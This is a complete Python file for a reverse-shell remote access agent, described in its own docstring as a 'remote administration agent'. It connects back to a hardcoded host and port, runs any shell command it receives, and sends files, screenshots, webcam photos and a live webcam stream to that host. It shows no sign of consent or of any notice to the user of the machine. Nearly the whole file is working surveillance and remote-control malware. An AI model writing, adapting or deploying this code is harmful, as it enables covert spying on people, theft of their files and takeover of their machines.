import socket
import os
import sys
import subprocess
import cv2
from PIL import ImageGrab
import pickle
import struct
import time
import logging
from pathlib import Path
from typing import Optional, Tuple

# Configuration
CONFIG = {
    'host': "192.168.2.107",
    'port': 444,
    'webcam_port': 4444,
    'webcam_width': 640,
    'webcam_height': 480,
    'jpeg_quality': 90,
    'buffer_size': 4096,
    'reconnect_delay': 5,
    'max_reconnect_attempts': 10
}

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)


class Agent:
    """Remote administration agent with improved error handling and structure."""
    
    def __init__(self, host: str, port: int):
        self.host = host
        self.port = port
        self.socket: Optional[socket.socket] = None
        
    def connect(self, max_attempts: int = CONFIG['max_reconnect_attempts']) -> bool:
        """Establish connection to server with retry mechanism."""
        for attempt in range(max_attempts):
            try:
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.connect((self.host, self.port))
                logger.info(f"Connected to {self.host}:{self.port}")
                return True
            except socket.error as e:
                logger.warning(f"Connection attempt {attempt + 1} failed: {e}")
                if attempt < max_attempts - 1:
                    time.sleep(CONFIG['reconnect_delay'])
                self.socket = None
        
        logger.error("Failed to connect after maximum attempts")
        return False
    
    def send_data(self, data: bytes) -> bool:
        """Send data with error handling."""
        try:
            self.socket.sendall(data)
            return True
        except socket.error as e:
            logger.error(f"Error sending data: {e}")
            return False
    
    def recv_data(self, buffer_size: int = CONFIG['buffer_size']) -> Optional[bytes]:
        """Receive data with error handling."""
        try:
            return self.socket.recv(buffer_size)
        except socket.error as e:
            logger.error(f"Error receiving data: {e}")
            return None
    
    def webcam_stream(self):
        """Stream webcam feed to server."""
        webcam_socket = None
        cam = None
        
        try:
            webcam_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            webcam_socket.connect((self.host, CONFIG['webcam_port']))
            
            cam = cv2.VideoCapture(0)
            if not cam.isOpened():
                logger.error("Failed to open webcam")
                return
            
            cam.set(cv2.CAP_PROP_FRAME_WIDTH, CONFIG['webcam_width'])
            cam.set(cv2.CAP_PROP_FRAME_HEIGHT, CONFIG['webcam_height'])
            encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), CONFIG['jpeg_quality']]
            
            logger.info("Starting webcam stream...")
            
            while True:
                ret, frame = cam.read()
                if not ret:
                    logger.warning("Failed to capture frame")
                    break
                
                # Encode frame
                result, encoded_frame = cv2.imencode('.jpg', frame, encode_param)
                if not result:
                    continue
                
                # Serialize and send
                data = pickle.dumps(encoded_frame, protocol=pickle.HIGHEST_PROTOCOL)
                size = len(data)
                
                try:
                    webcam_socket.sendall(struct.pack(">L", size) + data)
                    signal = webcam_socket.recv(1024)
                    
                    if b"DONE" in signal:
                        break
                except socket.error as e:
                    logger.error(f"Webcam stream error: {e}")
                    break
                    
        except Exception as e:
            logger.error(f"Webcam stream exception: {e}")
        finally:
            if cam:
                cam.release()
            if webcam_socket:
                webcam_socket.close()
            logger.info("Webcam stream stopped")
    
    def capture_photo(self) -> Optional[bytes]:
        """Capture a single photo from webcam."""
        cam = None
        try:
            cam = cv2.VideoCapture(0)
            if not cam.isOpened():
                logger.error("Failed to open webcam")
                return None
            
            ret, frame = cam.read()
            if not ret:
                logger.error("Failed to capture photo")
                return None
            
            # Encode to JPEG
            result, encoded = cv2.imencode('.jpg', frame, 
                [int(cv2.IMWRITE_JPEG_QUALITY), CONFIG['jpeg_quality']])
            
            return encoded.tobytes() if result else None
            
        except Exception as e:
            logger.error(f"Photo capture error: {e}")
            return None
        finally:
            if cam:
                cam.release()
    
    def send_file(self, filepath: str) -> bool:
        """Send file to server in chunks."""
        try:
            path = Path(filepath)
            if not path.exists():
                logger.error(f"File not found: {filepath}")
                self.send_data(b"ERROR: File not found")
                return False
            
            with open(path, 'rb') as file:
                while True:
                    chunk = file.read(CONFIG['buffer_size'])
                    if not chunk:
                        break
                    if not self.send_data(chunk):
                        return False
            
            self.send_data(b"DONE")
            logger.info(f"File sent: {filepath}")
            return True
            
        except Exception as e:
            logger.error(f"File transfer error: {e}")
            self.send_data(b"ERROR: Transfer failed")
            return False
    
    def take_screenshot(self) -> Optional[bytes]:
        """Capture screenshot."""
        try:
            screenshot = ImageGrab.grab()
            
            # Save to bytes buffer
            from io import BytesIO
            buffer = BytesIO()
            screenshot.save(buffer, format='JPEG', quality=CONFIG['jpeg_quality'])
            
            return buffer.getvalue()
            
        except Exception as e:
            logger.error(f"Screenshot error: {e}")
            return None
    
    def change_directory(self, path: str) -> str:
        """Change working directory."""
        try:
            os.chdir(path)
            new_path = os.getcwd()
            logger.info(f"Changed directory to: {new_path}")
            return new_path
        except FileNotFoundError:
            return "ERROR: Directory not found"
        except PermissionError:
            return "ERROR: Permission denied"
        except Exception as e:
            return f"ERROR: {str(e)}"
    
    def execute_command(self, command: str) -> str:
        """Execute shell command and return output."""
        try:
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30
            )
            return result.stdout + result.stderr
        except subprocess.TimeoutExpired:
            return "ERROR: Command timed out"
        except Exception as e:
            return f"ERROR: {str(e)}"
    
    def handle_command(self, command: bytes):
        """Process received command."""
        try:
            cmd_str = command.decode('utf-8', errors='ignore').strip()
            
            if cmd_str == "terminate":
                logger.info("Termination command received")
                return False
            
            elif cmd_str.startswith("cd "):
                path = cmd_str[3:].strip()
                result = self.change_directory(path)
                self.send_data(result.encode('utf-8'))
            
            elif cmd_str.startswith("download "):
                filename = cmd_str[9:].strip()
                self.send_file(filename)
            
            elif cmd_str == "screenshot":
                screenshot_data = self.take_screenshot()
                if screenshot_data:
                    self.send_data(screenshot_data)
                    self.send_data(b"DONE")
                else:
                    self.send_data(b"ERROR: Screenshot failed")
            
            elif cmd_str == "campic":
                photo_data = self.capture_photo()
                if photo_data:
                    self.send_data(photo_data)
                    self.send_data(b"DONE")
                else:
                    self.send_data(b"ERROR: Photo capture failed")
            
            elif cmd_str == "webcam":
                self.webcam_stream()
            
            elif cmd_str:
                result = self.execute_command(cmd_str)
                self.send_data(result.encode('utf-8', errors='ignore'))
            
            return True
            
        except Exception as e:
            logger.error(f"Command handling error: {e}")
            self.send_data(f"ERROR: {str(e)}".encode('utf-8'))
            return True
    
    def run(self):
        """Main agent loop."""
        if not self.connect():
            return
        
        logger.info("Agent running...")
        
        try:
            while True:
                command = self.recv_data(2048)
                
                if not command:
                    logger.warning("Connection lost")
                    break
                
                if not self.handle_command(command):
                    break
                    
        except KeyboardInterrupt:
            logger.info("Agent stopped by user")
        except Exception as e:
            logger.error(f"Agent error: {e}")
        finally:
            if self.socket:
                self.socket.close()
            logger.info("Agent terminated")


def main():
    """Entry point."""
    agent = Agent(CONFIG['host'], CONFIG['port'])
    agent.run()


if __name__ == "__main__":
    main()
